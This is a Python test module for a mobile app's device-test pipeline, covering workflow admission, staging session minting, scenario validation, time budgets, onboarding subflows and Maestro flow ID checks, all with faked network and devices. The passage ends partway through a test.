"""May Playground device tests (device-tests.yml): gate.py --action device-tests, prepare.py on main's head,
device_tests.py and publish.py device-open / device-push. Everything Android, GitHub and staging is faked."""

import ast
import http.client
import io
import json
import os
from pathlib import Path
import re
import shutil
import subprocess
import sys
import tarfile
import tempfile
import unittest
from unittest.mock import patch
import urllib.error

import device_agent
import device_tests
from device_tests import DeviceTestsError
import gate
from gate import GateDenial, validate_run
import prepare
from prepare import PrepareError, fetch
import publish
from publish import PublishError
import static_check
import store
from test_renders import png

REPO, MAIN, DISPATCH = "May-Assistant/may-releases", "refs/heads/main", "workflow_dispatch"
SHA = "a" * 40
RUN = "20261021-" + SHA[:12]
ROOT = Path(__file__).resolve().parents[2]
WORKFLOW = ".github/workflows/device-tests.yml"
RECIPIENT = "age1" + "q" * 58
TOKEN = "session-token-" + "x" * 30


def no_network(opener, request, *args, **kwargs):
    url = getattr(request, "full_url", str(request))
    raise AssertionError("a device test reached the network: " + url.split("?")[0])


def network_tripwire():
    """For each device test module's setUpModule: every real urlopen (OpenerDirector.open, which the readers' bound
    defaults reach too) fails the test, so a reader a test forgot to fake never calls staging."""
    return patch("urllib.request.OpenerDirector.open", no_network)


TRIPWIRE = network_tripwire()


def setUpModule():
    TRIPWIRE.start()


def tearDownModule():
    TRIPWIRE.stop()


# Marks a line the fake adb shell read on stdin, in a run's recorded calls: never an argument.
STDIN = "<adb shell stdin>"
# A flow written for both devices, as may-app tags it.
FLOW = "appId: x\nname: A flow\ntags:\n  - android\n  - ios\n---\n- launchApp\n"
MP4 = b"\0\0\0\x18ftypmp42" + b"\0" * 32


class Done:
    def __init__(self, returncode):
        self.returncode = returncode


class GateTests(unittest.TestCase):
    def test_dispatch_and_the_nightly_schedule_from_main_alone(self):
        self.assertEqual(validate_run(REPO, MAIN, DISPATCH, SHA, "device-tests"), "may-device-tests")
        self.assertEqual(validate_run(REPO, MAIN, "schedule", "main", "device-tests"), "may-device-tests")
        self.assertIn("device-tests", gate.NO_REVIEWER_ACTIONS)
        for repo, ref, event, sha, action in ((REPO, "refs/heads/x", "schedule", "main", "device-tests"),
                                              (REPO, MAIN, "push", SHA, "device-tests"),
                                              (REPO, MAIN, "schedule", SHA, "compile"),
                                              (REPO, MAIN, DISPATCH, "main", "compile"),
                                              (REPO, MAIN, DISPATCH, "HEAD", "device-tests")):
            with self.subTest(event=event, sha=sha, action=action), self.assertRaises(GateDenial):
                validate_run(repo, ref, event, sha, action)


    def test_admission_reads_may_device_tests_alone_never_may_native_compile(self):
        # Run 39668495406: admission also checked may-native-compile, whose required reviewer (Samuel) the
        # no-reviewer rule refuses, so a dispatch could never be admitted.
        from test_compile_pr import ENVIRONMENT, POLICIES, REVIEWER_RULE
        checked = []

        def fake_json(path, token):
            name = path.split("/")[1]
            checked.append(name)
            if path.endswith("per_page=100"):
                return POLICIES
            return dict(ENVIRONMENT, protection_rules=[REVIEWER_RULE] if name == "may-native-compile" else [])

        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / "output"
            env = {"GITHUB_REPOSITORY": REPO, "GITHUB_REF": MAIN, "GITHUB_EVENT_NAME": DISPATCH, "GH_TOKEN": "fixture",
                   "GITHUB_OUTPUT": str(output), "GITHUB_TRIGGERING_ACTOR": "samuelalake"}
            with patch.dict(os.environ, env, clear=True), patch("gate.get_json", side_effect=fake_json), \
                    patch("sys.argv", ["gate.py", "--action", "device-tests", "--source-sha", "main"]), \
                    patch("sys.stdout", new_callable=io.StringIO) as out:
                try:
                    gate.main()
                except GateDenial as denial:
                    self.fail("device-tests admission was denied: " + denial.args[0])
            self.assertEqual(sorted(set(checked)), ["may-device-tests"])
            self.assertEqual(output.read_text(), "environment=may-device-tests\nbuild_environment=may-device-tests\n")
        self.assertEqual(out.getvalue().strip(), "May device-tests admission passed for may-app main's head (a may-app "
                                                 "main commit; dispatched by samuelalake)")
        with patch("gate.get_json", side_effect=lambda path, token: POLICIES if path.endswith("per_page=100") else
                   dict(ENVIRONMENT, protection_rules=[REVIEWER_RULE])), \
                patch.dict(os.environ, env, clear=True), \
                patch("sys.argv", ["gate.py", "--action", "device-tests", "--source-sha", "main"]), \
                self.assertRaises(GateDenial):
            gate.main()

class MainHeadTests(unittest.TestCase):
    def test_main_resolves_to_main_head_and_is_checked_out_exactly(self):
        with tempfile.TemporaryDirectory() as directory:
            private = Path(directory) / "may-private"
            private.mkdir()
            calls = []
            with patch("prepare.quiet", side_effect=lambda argv, log, env: calls.append(argv)), \
                    patch("prepare.git_status", return_value=0), patch("prepare.head_of", return_value=SHA):
                resolved = fetch(Path(directory) / "may-source", "git@example.invalid:x.git", "main", "fixture key",
                                 private, "app", main_history=True)
        self.assertEqual(resolved, SHA)
        self.assertIn(["git", "-C", str(Path(directory) / "may-source"), "-c", "advice.detachedHead=false", "checkout",
                       "--quiet", "--detach", SHA], calls)

    def test_main_is_refused_outside_main_history_and_unresolved_heads(self):
        with tempfile.TemporaryDirectory() as directory:
            private = Path(directory) / "may-private"
            private.mkdir()
            with patch("prepare.quiet"), patch("prepare.git_status", return_value=0), \
                    patch("prepare.head_of", return_value=SHA), self.assertRaises(PrepareError):
                fetch(Path(directory) / "a", "git@example.invalid:x.git", "main", "k", private, "app", pull="42")
            with patch("prepare.quiet"), patch("prepare.git_status", return_value=0), \
                    patch("prepare.head_of", return_value=""), self.assertRaises(PrepareError):
                fetch(Path(directory) / "b", "git@example.invalid:x.git", "main", "k", private, "app",
                      main_history=True)


class ScenarioTests(unittest.TestCase):
    def test_the_committed_list(self):
        ids = [row["id"] for row in device_tests.scenarios()]
        self.assertEqual(ids, ["sign-in", "sign-out", "connections", "connection-detail", "chat", "notes", "poll",
                               "poll-skip", "routines"])
        self.assertEqual([row["id"] for row in device_tests.scenarios("all", "ios")], ids, "both devices run all")
        self.assertEqual([row["id"] for row in device_tests.scenarios("connections")], ["connections"])
        with self.assertRaises(DeviceTestsError):
            device_tests.scenarios("sign-in,unknown")

    def test_the_notes_scenario_writes_into_its_own_tagged_task(self):
        """Run 40063426822: "the first item you see" was the shared account's, so the note joined the previous run's."""
        goal = device_tests.scenarios("notes")[0]["goal"]
        self.assertIn("add a new task titled {tag} task", goal)
        self.assertIn("on the {tag} task", goal)
        self.assertNotIn("first item", goal)

    def test_the_notes_scenario_uses_the_details_notes_field(self):
        """Run 40095010166: the task detail has Details, Thread and Files, its notes field on Details ("Add notes");
        both judges failed a goal that asked for a Notes tab."""
        goal = device_tests.scenarios("notes")[0]["goal"]
        self.assertIn("On its Details, tap the notes field that says Add notes", goal)
        self.assertIn("open the {tag} task again", goal, "the note is checked after reopening the task")
        for stale in ("Notes tab", "Take notes"):
            self.assertNotIn(stale, goal)

    def test_every_agent_scenario_fits_inside_one_test_session(self):
        """Run 40063426822: an iOS session ended mid-scenario; a session lasts SESSION_SECONDS and has no refresh, so
        each agent's cap leaves ten minutes for the launch, recording, stop and server reads."""
        for seconds in (device_agent.AGENT_SECONDS, device_agent.IOS_AGENT_SECONDS):
            self.assertLessEqual(seconds + 10 * 60, device_tests.SESSION_SECONDS)

    def test_the_chat_scripts_are_neutral_and_carry_the_tag(self):
        """Run 40087626039: "a question about my week" drew crisis-safety replies; the scripts test delivery, not that."""
        goals = {row["id"]: row["goal"] for row in device_tests.scenarios("chat,poll,poll-skip", "android")}
        self.assertIn("Reply with the word received", goals["chat"])
        for scenario in ("poll", "poll-skip"):
            self.assertIn("which fruit I'd like as a snack, with three choices, tag {tag}", goals[scenario])
        self.assertIn("I'll answer myself: apples, {tag}", goals["poll-skip"])
        for scenario, goal in goals.items():
            with self.subTest(scenario=scenario):
                self.assertNotRegex(goal.lower(), r"\b(week|feel|feeling|mood|stress|worr)", "no personal or feelings topic")

    def test_malformed_rows_are_refused(self):
        good = device_tests.scenarios()[0]
        for change in ({"id": "Sign In"}, {"flow": "../x.yaml"}, {"driver": "shell"}, {"platforms": ["web"]},
                       {"outward": "no"}, {"fresh": "yes"}, {"server": [{"get": "https://elsewhere/v1/x", "expect": 200}]},
                       {"server": [{"get": "/v1/me", "expect": 500}]}):
            with self.subTest(change=change), tempfile.TemporaryDirectory() as directory:
                path = Path(directory) / "s.json"
                path.write_text(json.dumps([dict(good, **change)]))
                with patch("device_tests.SCENARIOS", path), self.assertRaises(DeviceTestsError):
                    device_tests.scenarios()
        agent = device_tests.scenarios("notes")[0]
        for change in ({"goal": "no tag here"}, {"goal": "{tag} " + "x" * 1500}, {"flow": "notes.yaml"},
                       {"truth": [{"get": "/v1/account/devices"}]}, {"truth": [{"get": "/v1/routines", "x": 1}]},
                       {"truth": [{"get": "/v1/event-notes"}]}, {"truth": [{"question": "pending"}]},
                       {"truth": [{"question": "answered", "get": "/v1/routines"}]},
                       {"truth": "/v1/routines"}):
            with self.subTest(change=change), tempfile.TemporaryDirectory() as directory:
                path = Path(directory) / "s.json"
                path.write_text(json.dumps([dict(agent, **change)]))
                with patch("device_tests.SCENARIOS", path), self.assertRaises(DeviceTestsError):
                    device_tests.scenarios()


class FakeReply(io.BytesIO):
    status = 200

    def __enter__(self):
        return self

    def __exit__(self, *args):
        return False


class MintTests(unittest.TestCase):
    def test_mints_with_the_secret_in_the_body_and_returns_only_a_token(self):
        seen = {}

        def post(request, timeout):
            seen.update(url=request.full_url, auth=request.headers.get("Authorization"), body=json.loads(request.data))
            return FakeReply(json.dumps({"token": TOKEN, "expires_at": "2026-10-21T06:00:00Z",
                                         "user_id": "u_1"}).encode())

        self.assertEqual(device_tests.mint("https://staging.example", "s" * 32, post), TOKEN)
        self.assertEqual(seen, {"url": "https://staging.example/v1/auth/test-session", "auth": None,
                                "body": {"secret": "s" * 32}})

    def test_a_bad_reply_is_refused(self):
        for reply in (b"not json", b"{}", json.dumps({"token": "short"}).encode()):
            with self.subTest(reply=reply), self.assertRaises(DeviceTestsError):
                device_tests.mint("https://staging.example", "s", lambda request, timeout: FakeReply(reply))

        def refused(request, timeout):
            raise urllib.error.HTTPError(request.full_url, 403, "no", {}, None)

        with self.assertRaises(DeviceTestsError):
            device_tests.mint("https://staging.example", "s", refused)

    def test_a_fresh_mint_asks_for_its_own_account_and_a_used_up_day_is_its_own_refusal(self):
        seen = {}

        def post(request, timeout):
            seen["body"] = json.loads(request.data)
            return FakeReply(json.dumps({"token": TOKEN, "expires_at": "x", "user_id": "u", "fresh": True}).encode())

        self.assertEqual(device_tests.mint("https://s", "s" * 32, post, fresh=True), TOKEN)
        self.assertEqual(seen["body"], {"secret": "s" * 32, "fresh": True})
        for reply in ({"token": TOKEN, "expires_at": "x", "user_id": "u"}, {"token": TOKEN, "fresh": False},
                      {"token": TOKEN, "fresh": "true"}):
            with self.subTest(reply=reply):
                answer = lambda request, timeout: FakeReply(json.dumps(reply).encode())  # noqa: E731
                with self.assertRaises(device_tests.FreshRefused) as caught:
                    device_tests.mint("https://s", "s", answer, fresh=True)
                self.assertEqual(caught.exception.reason, device_tests.NOT_FRESH,
                                 "a session on the shared account is never taken for a fresh one")
                self.assertEqual(device_tests.mint("https://s", "s", answer), TOKEN, "a shared mint reads no fresh")

        def refused(code, status=429):
            def answer(request, timeout):
                raise urllib.error.HTTPError(request.full_url, status, "no", {}, io.BytesIO(
                    json.dumps({"error": {"code": code, "message": "m", "request_id": "r"}}).encode()))
            return answer

        with self.assertRaises(device_tests.FreshExhausted):
            device_tests.mint("https://s", "s", refused("fresh_accounts_exhausted"), fresh=True)
        for answer, fresh in ((refused("rate_limited"), True), (refused("fresh_accounts_exhausted", 403), True),
                              (refused("fresh_accounts_exhausted"), False)):
            with self.subTest(fresh=fresh), self.assertRaises(DeviceTestsError) as caught:
                device_tests.mint("https://s", "s", answer, fresh=fresh)
            self.assertNotIsInstance(caught.exception, device_tests.FreshExhausted)

    def test_which_scenarios_run_fresh(self):
        agent, smoke = {"id": "chat", "driver": "agent"}, {"id": "smoke", "driver": device_tests.SMOKE}
        for env, row, fresh in (({}, agent, False), ({}, dict(agent, fresh=True), True),
                                ({device_tests.FRESH: "all"}, agent, True), ({device_tests.FRESH: " poll, chat"}, agent, True),
                                ({device_tests.FRESH: "poll"}, agent, False), ({device_tests.FRESH: "all"}, smoke, False),
                                ({}, dict(smoke, fresh=True), False)):
            with self.subTest(env=env, row=row), patch.dict(os.environ, env, clear=True):
                self.assertIs(device_tests.wants_fresh(row, device_tests.fresh_switch()), fresh)

    def test_a_failed_mint_names_its_status_alone(self):
        def refused(status):
            def answer(request, timeout):
                raise urllib.error.HTTPError(request.full_url, status, "no", {}, None)
            return answer

        def offline(request, timeout):
            raise urllib.error.URLError("down")

        for post, status, words in ((refused(429), 429, "HTTP 429"), (refused(502), 502, "HTTP 502"),
                                    (offline, 0, "no reply")):
            with self.subTest(words=words), self.assertRaises(device_tests.MintFailed) as failed:
                device_tests.mint("https://s", "s" * 32, post)
            self.assertEqual(failed.exception.status, status)
            self.assertEqual(failed.exception.args[0], f"The staging test session could not be minted ({words})")
            self.assertNotIn("s" * 32, failed.exception.args[0])

    def test_server_check_status(self):
        def refused(request, timeout):
            raise urllib.error.HTTPError(request.full_url, 401, "no", {}, None)

        self.assertEqual(device_tests.server_check("https://s.example", TOKEN, "/v1/me", lambda r, timeout: FakeReply(b"")), 200)
        self.assertEqual(device_tests.server_check("https://s.example", TOKEN, "/v1/me", refused), 401)


class FakeRecorder:
    def __init__(self, adb, env, scenario, log):
        self.scenario = scenario

    def start(self):
        pass

    def stop(self, folder):
        (folder / (self.scenario + ".mp4")).write_bytes(MP4)
        return [self.scenario + ".mp4"]


def ticking_budget():
    """A budget of one Maestro flow on a clock that has used it up by the second scenario."""
    ticks = iter([0, 0, device_tests.FLOW_SECONDS])
    return device_tests.Budget(total=device_tests.FLOW_SECONDS + 1, clock=lambda: next(ticks))


class BootTests(unittest.TestCase):
    def test_the_emulator_runs_its_animations_at_normal_speed(self):
        puts = []

        class Done:
            returncode, stdout = 0, b"1\n"

        class Emulator:
            def poll(self):
                return None

        def private(argv, log, *, env=None, timeout=None):
            if argv[1:4] == ["shell", "settings", "put"]:
                puts.append(argv[4:])
            return 0

        with tempfile.TemporaryDirectory() as directory, \
                patch("device_tests.flows.sdk", return_value=Path("/sdk")), \
                patch("device_tests.flows.sdk_tool", side_effect=lambda home, tool: str(home / tool)), \
                patch("device_tests.subprocess.run", return_value=Done()), \
                patch("device_tests.subprocess.Popen", return_value=Emulator()), \
                patch("device_tests.flows.run_private", side_effect=private):
            root = Path(directory)
            device_tests.boot(root, root / "log")
        self.assertEqual(puts, [["global", setting, "1"] for setting in
                                ("window_animation_scale", "transition_animation_scale", "animator_duration_scale")],
                         "at 0, Compose's reduced motion stops the mascot ring and the recording hides the design")


class BudgetTests(unittest.TestCase):
    def test_a_scenario_starts_only_when_its_cap_and_all_judging_still_fit(self):
        now = [0]
        budget = device_tests.Budget(total=3600, clock=lambda: now[0])
        agent, maestro = {"driver": "agent"}, {"driver": "maestro"}
        judge = device_agent.JUDGE_SECONDS
        self.assertTrue(budget.fits(agent, 1200))
        self.assertEqual(budget.judging, judge)
        now[0] = 1200
        self.assertFalse(budget.fits(agent, 3600 - 1200 - judge), "its own judging no longer fits")
        self.assertEqual(budget.judging, judge, "a scenario not started reserves nothing")
        self.assertTrue(budget.fits(maestro, 3600 - 1200 - judge))
        now[0] = 3600 - judge
        self.assertFalse(budget.fits(maestro, 1))

    def test_each_platform_caps_a_scenario_by_its_own_timeout(self):
        self.assertEqual(device_tests.cap({"driver": "maestro"}), device_tests.FLOW_SECONDS)
        # An agent scenario's cap holds the onboarding subflow run before it.
        self.assertEqual(device_tests.cap({"driver": "agent"}),
                         device_agent.AGENT_SECONDS + device_tests.ONBOARDING_SECONDS)
        self.assertEqual(device_tests.cap({"driver": "agent"}, device_agent.IOS_AGENT_SECONDS),
                         device_agent.IOS_AGENT_SECONDS + device_tests.ONBOARDING_SECONDS)
        self.assertEqual(device_tests.cap({"driver": device_tests.SMOKE}), device_agent.AGENT_SECONDS)

    def test_the_budget_leaves_the_job_time_to_build_seal_and_publish(self):
        workflow = (Path(device_tests.__file__).parent.parent.parent / ".github/workflows/device-tests.yml").read_text()
        timeouts = re.findall(r"(?m)^    timeout-minutes: (\d+)$", workflow)
        job = min(int(minutes) for minutes in timeouts[:2]) * 60
        previews = re.findall(r"(?m)^        continue-on-error: true\n        timeout-minutes: (\d+)\n"
                              r"        run: python3 -I -S -B tools/may_release/device_tests.py previews", workflow)
        self.assertEqual(len(previews), 2, "each device job bounds its preview step")
        # Run 40075535088: a 25-minute preview step after a full 100-minute run could outlast the job's 120 minutes,
        # so the seal never ran and the report was lost.
        self.assertLessEqual(device_tests.RUN_BUDGET_SECONDS + max(int(m) for m in previews) * 60 + 8 * 60 + 10 * 60,
                             job, "the build (about 8 minutes), the previews and 10 minutes to seal and hand over "
                             "must fit after the run")
        self.assertLess(device_tests.PREVIEW_STEP_SECONDS, min(int(m) for m in previews) * 60,
                        "no preview starts so late that the step's timeout stops it")


class OnboardingTests(unittest.TestCase):
    """Run 40046272749: the signed-in shared account lands in onboarding ("Hi, I'm May"), not Chats, so each agent
    scenario first runs may-app's subflow that taps through it."""

    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.source = Path(self.directory.name)
        (self.source / device_tests.FLOWS_DIR / "subflows").mkdir(parents=True)
        self.flow = self.source / device_tests.FLOWS_DIR / device_tests.ONBOARDING

    def tearDown(self):
        self.directory.cleanup()

    def finish(self, row, passed=True):
        driven = []

        def drive(flow):
            driven.append(flow)
            if isinstance(passed, Exception):
                raise passed
            return passed

        with patch("sys.stdout", new_callable=io.StringIO) as out:
            device_tests.finish_onboarding(row, self.source, "android", drive)
        return driven, out.getvalue()

    def test_an_agent_scenario_runs_the_subflow_first(self):
        self.flow.write_text("appId: x\n")
        self.assertEqual(self.finish({"id": "chat", "driver": "agent"}), ([self.flow], ""))

    def test_a_maestro_or_smoke_scenario_does_not(self):
        self.flow.write_text("appId: x\n")
        for driver in ("maestro", device_tests.SMOKE):
            with self.subTest(driver=driver):
                self.assertEqual(self.finish({"id": "sign-in", "driver": driver}), ([], ""))

    def test_without_the_subflow_the_agent_starts_from_launch_and_says_so(self):
        self.assertEqual(self.finish({"id": "chat", "driver": "agent"}), (
            [], "May device tests (android): chat: may-app has no onboarding subflow; the agent starts from launch\n"))
        self.flow.symlink_to(self.source / "elsewhere.yaml")
        self.assertEqual(self.finish({"id": "chat", "driver": "agent"})[0], [], "a symlinked subflow is not run")

    def test_a_subflow_that_fails_or_times_out_is_said_and_the_agent_still_runs(self):
        self.flow.write_text("appId: x\n")
        for passed in (False, subprocess.TimeoutExpired("maestro", 1)):
            with self.subTest(passed=passed):
                self.assertEqual(self.finish({"id": "chat", "driver": "agent"}, passed)[1],
                                 "May device tests (android): chat: the onboarding subflow did not pass; the agent "
                                 "starts where it stopped\n")


class FlowIdTests(unittest.TestCase):
    """A Maestro flow's ids against the app's own sources, so a flow naming an id the app lacks never runs."""

    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.root = Path(self.directory.name)

    def tearDown(self):
        self.directory.cleanup()

    def write(self, relative, text):
        path = self.root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
        return path

    def test_a_flow_and_the_flows_it_runs_give_their_ids(self):
        self.write("flows/start.yaml", 'appId: x\n---\n- tapOn:\n    id: "demo-start"\n- runFlow: start.yaml\n')
        self.write("flows/sub/finish.yaml", "appId: x\n---\n- assertVisible:\n    id: demo-done  # the end\n")
        self.write("flows/sub/when.yaml", "appId: x\n---\n- tapOn: {id: \"demo-when\", optional: true}\n")
        self.write("flows/script.yaml", "appId: x\n---\n- tapOn:\n    id: demo-script\n")
        self.write("outside.yaml", "appId: x\n---\n- tapOn:\n    id: demo-outside\n")
        flow = self.write("flows/main.yaml", "\n".join((
            "appId: x", "---", "- runFlow: start.yaml", "- runFlow: sub/finish.yaml", "- runFlow: ../outside.yaml",
            "- runFlow:", "    when:", "      visible:", "        id: \"demo-gate\"", "    file: sub/when.yaml",
            "- runFlow:", "    file: '../outside.yaml'",
            "- runScript:", "    file: script.js",
            "- tapOn: {id: 'demo-inline'}", "- assertVisible: { id: demo-spaced, enabled: true }",
            "- extendedWaitUntil:", "    visible:", "      id: 'demo-list|demo-empty'", "# id: demo-commented",
            "- tapOn: \"Settings\"  # id: demo-trailing", "")))
        self.assertEqual(device_tests.flow_ids(flow), {
            "demo-start", "demo-done", "demo-gate", "demo-when", "demo-inline", "demo-spaced", "demo-list|demo-empty"},
            "runFlow's file: form is followed and inline {id: …} is read; a loop, a comment, a label, a script and a "
            "flow outside the folder give nothing")

    def test_the_app_literals_leave_test_code_fixtures_and_previews_out(self):
        self.write("android/app/src/main/Rows.kt", 'val tag = "demo.row.${c.wire}"\nval wire = "calendar"\n'
                                                     'val name = "$title"\nval quote = "say \\"hi\\""\n')
        self.write("android/app/src/main/kotlin/may/testsession/Gate.kt", 'val gate = "demo-testsession"\n')
        self.write("android/app/src/playground/kotlin/may/Hook.kt", 'val hook = "demo-playground"\n')
        self.write("ios/App/Shared/Rows.swift", 'let tag = "demo.cell.\\(row.wire)"\n')
        self.write("ios/App/Shared/flows/Steps.swift", 'let steps = "demo-ios-flows-folder"\n')
        for test in ("android/app/src/test/T.kt", "android/app/src/testPlayground/T.kt", "android/app/src/androidTest/T.kt",
                     "android/app/src/androidTestPlayground/T.kt", "android/app/src/previews/P.kt",
                     "android/flows/src/F.kt", "ios/App/Snapshots/S.swift", "ios/AppTests/T.swift",
                     "ios/MayCore/Tests/MayCoreTests/T.swift", "ios/App/Playground/ParityFixtures.swift",
                     "android/app/src/main/RowsTest.kt", "ios/App/Shared/RowsTests.swift"):
            self.write(test, 'val only = "demo-test-only"\n')
        whole, starts = device_tests.app_literals([self.root / "android", self.root / "ios"])
        self.assertEqual(whole, {"calendar", 'say \\"hi\\"', "demo-testsession", "demo-playground",
                                 "demo-ios-flows-folder"},
                         "only whole test source sets and targets, fixtures, previews and the flows module are left out")
        self.assertEqual(starts, {"demo.row.", "demo.cell."})

    def test_an_id_is_there_as_a_literal_or_a_fixed_start_and_a_literal_remainder(self):
        literals = ({"demo-root", "demo-list", "calendar"}, {"demo.row."})
        self.assertEqual(device_tests.lacking_ids({"demo-root", "demo.row.calendar", "demo-list"}, literals), [])
        self.assertEqual(device_tests.lacking_ids({"demo-rootX", "demo.row.calendarX", "demo-list|demo-gone",
                                                   "demo-.*", "demo-(a|b)"}, literals),
                         ["demo-gone", "demo-rootX", "demo.row.calendarX"],
                         "a misspelt id, a row id with a misspelt remainder and a missing alternative are caught; "
                         "an id using pattern syntax is not checked")

    def test_each_platform_reads_may_app_and_the_design_system_where_prepare_puts_it(self):
        """prepare.py moves the design system into may-source/android/build-deps/may-design-system; its Kotlin is
        under android/ and its Swift under swift/ (the coordinator's review of #102)."""
        ds = "may-source/android/build-deps/may-design-system"
        self.write("may-source/android/app/src/main/A.kt", 'val a = "demo-app-android"\n')
        self.write("may-source/ios/App/C.swift", 'let c = "demo-app-ios"\n')
        self.write(f"{ds}/android/components/src/main/B.kt", 'val b = "demo-ds-android"\n')
        self.write(f"{ds}/swift/Sources/MayDS/D.swift", 'let d = "demo-ds-swift"\n')
        self.write(f"{ds}/swift/Tests/MayDSTests/T.swift", 'let t = "demo-ds-test"\n')
        android, ios = device_tests.app_sources(self.root, "android"), device_tests.app_sources(self.root, "ios")
        self.assertEqual(android()[0], {"demo-app-android", "demo-ds-android"}, "no Swift counts for Android")
        self.assertEqual(ios()[0], {"demo-app-ios", "demo-ds-swift"}, "the design system's Swift counts for iOS")
        self.assertIs(android(), android(), "read once a run")


class RunTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.root = Path(self.directory.name)
        self.source, self.private = self.root / "may-source", self.root / "may-private"
        (self.source / "android/app/build/outputs/apk/playground/debug").mkdir(parents=True)
        (self.source / device_tests.APK).write_bytes(b"apk")
        (self.source / device_tests.FLOWS_DIR).mkdir(parents=True)
        (self.source / device_tests.FLOWS_DIR / "sign-in.yaml").write_text(FLOW)
        self.private.mkdir()
        self.env = {"RUNNER_TEMP": str(self.root), "MAY_TEST_SIGNIN_SECRET": "s" * 32,
                    "MAY_STAGING_API_URL": "https://staging-api.usemay.co", "PATH": "/usr/bin:/bin"}

    def tearDown(self):
        self.directory.cleanup()

    def run_it(self, env=None, selection="sign-in,connections", fail=(), status=200, budgeted=None, diagnosed=None):
        calls, self.maestro_envs = [], []
        shutil.rmtree(self.root / device_tests.OUT, ignore_errors=True)
        (self.private / device_tests.VERDICTS).unlink(missing_ok=True)
        (self.private / device_tests.AGENTS).unlink(missing_ok=True)

        class Process:
            def terminate(self):
                calls.append(["terminate"])

            def wait(self, timeout=None):
                return 0

        def private(argv, log, *, cwd=None, env=None, check=True, timeout=None):
            calls.append(list(argv))
            if argv[0] == "/fake/maestro":
                self.maestro_envs.append(dict(env or {}))
            return 1 if argv[-1].endswith(".xml") and any(f"/{name}.xml" in argv[-1] for name in fail) else 0

        def screenshot(adb, env, path, log):
            path.write_bytes(png())
            return path.name

        environ = dict(self.env, **(env or {}))
        with patch.dict(os.environ, {k: v for k, v in environ.items() if v is not None}, clear=True), \
                patch("device_tests.boot", return_value=("/sdk/adb", Process(), {})), \
                patch("device_tests.maestro", return_value=Path("/fake/maestro")), \
                patch("device_tests.flows.run_private", side_effect=private), \
                patch("device_tests.adb_shell", side_effect=lambda adb, env, log, line: calls.append(
                    [STDIN, *line.split()]) or 0), \
                patch("device_tests.flows.sdk", return_value=Path("/sdk")), \
                patch("device_tests.Recorder", FakeRecorder), patch("device_tests.screenshot", side_effect=screenshot), \
                patch("device_tests.head_revision", return_value=SHA), \
                patch("sys.stdout", new_callable=io.StringIO) as out:
            device_tests.run_scenarios(selection, minted=lambda base, secret: TOKEN,
                                       checked=lambda base, token, path: status, budgeted=budgeted,
                                       diagnosed=diagnosed)
            self.assertNotIn("MAY_TEST_SIGNIN_SECRET", os.environ)
            device_tests.judge_scenarios(judged_by=lambda *args: self.fail("judged a Maestro scenario"))
        runs = list((self.root / device_tests.OUT).iterdir())
        report = json.loads((runs[0] / "android" / "report.json").read_text())
        return calls, report, out.getvalue(), runs[0]

    def test_a_scenario_the_budget_cannot_fit_is_not_started_and_the_rest_is_still_reported(self):
        """Run 40035089599: iOS agent scenarios could outlast the job, losing every report."""
        calls, report, out, _ = self.run_it(budgeted=ticking_budget)
        sign_in, connections = report["scenarios"]
        self.assertEqual(sign_in["verdict"], "ui-pass")
        self.assertEqual((connections["verdict"], connections["reason"]), ("skipped", device_tests.BUDGET))
        self.assertEqual(len([argv for argv in calls if "start" in argv]), 1, "the second scenario never launched")
        self.assertIn("May device tests (android): 1 scenarios ran; verdicts follow the judge step", out)
        self.assertIn("May device tests (android): connections: skipped", out)
        self.assertEqual(json.loads((self.private / device_tests.VERDICTS).read_text()), ["ui-pass", "skipped"])

    def test_each_recording_shows_where_taps_land(self):
        """Samuel, 24 Oct: Android's show_touches on before the scenarios and off after, never stopping the run."""
        calls, _, _, _ = self.run_it()
        on = ["/sdk/adb", "shell", "settings", "put", "system", "show_touches", "1"]
        off = on[:-1] + ["0"]
        self.assertIn(on, calls)
        self.assertIn(off, calls)
        install = next(i for i, argv in enumerate(calls) if "install" in argv)
        first_start = next(i for i, argv in enumerate(calls) if "start" in argv)
        self.assertLess(install, calls.index(on))
        self.assertLess(calls.index(on), first_start, "on before any scenario launches")
        self.assertLess(max(i for i, argv in enumerate(calls) if "start" in argv), calls.index(off))
        self.assertLess(calls.index(off), calls.index(["terminate"]), "off before the emulator stops")
        with patch("device_tests.flows.run_private", return_value=1) as private:
            device_tests.show_touches("/sdk/adb", {}, Path("/log"), True)
        self.assertIs(private.call_args.kwargs["check"], False, "a setting that will not take never stops the run")

    def test_signs_in_runs_each_flow_records_and_reports(self):
        calls, report, out, run = self.run_it()
        start = [argv for argv in calls if "start" in argv][0]
        self.assertEqual(start[0], STDIN, "the start is read on adb shell's stdin")
        self.assertEqual(start[-3:], ["--es", "may_test_session", TOKEN])
        argvs = [argv for argv in calls if argv[0] != STDIN]
        self.assertNotIn(TOKEN, json.dumps(argvs), "the session is in no argument the job builds")
        self.assertEqual([row["id"] for row in report["scenarios"]], ["sign-in", "connections"])
        sign_in, connections = report["scenarios"]
        self.assertEqual((sign_in["verdict"], sign_in["videos"], sign_in["screenshots"]),
                         ("ui-pass", ["sign-in.mp4"], ["sign-in-end.png"]))
        self.assertEqual((connections["verdict"], connections["reason"]),
                         ("fail", "may-app has no Maestro flow for this scenario"))
        self.assertEqual(out.splitlines(), [
            "May device tests (android): 2 scenarios ran; verdicts follow the judge step",
            "May device tests (android): diagnostics kept for 0 scenarios (0 with an ANR, 0 with a crash)",
            "May device tests (android): sign-in: ui-pass", "May device tests (android): connections: fail",
            "May device tests (android): 0 passed, 1 passed on screen alone (server checks not configured), 1 failed, "
            "0 skipped"])
        self.assertNotIn(TOKEN, out)
        self.assertNotIn(TOKEN, (run / "android" / "report.json").read_text())
        self.assertRegex(run.name, r"^[0-9]{8}-" + SHA[:12] + "$")
        self.assertEqual(json.loads((self.private / device_tests.VERDICTS).read_text()), ["ui-pass", "fail"])
        self.assertIn(["terminate"], calls)

    def test_each_scenario_that_ran_keeps_its_diagnostics_and_the_log_gives_counts(self):
        kept = []

        class Fake:
            def __init__(self, adb, env):
                self.kept, self.anrs, self.crashes = 0, 0, 0

            def keep(self, folder, scenario, token):
                kept.append((folder.name, scenario, token))
                self.kept, self.anrs = self.kept + 1, 1

        (self.source / device_tests.FLOWS_DIR / "connections.yaml").write_text(FLOW)
        _, _, out, _ = self.run_it(diagnosed=Fake)
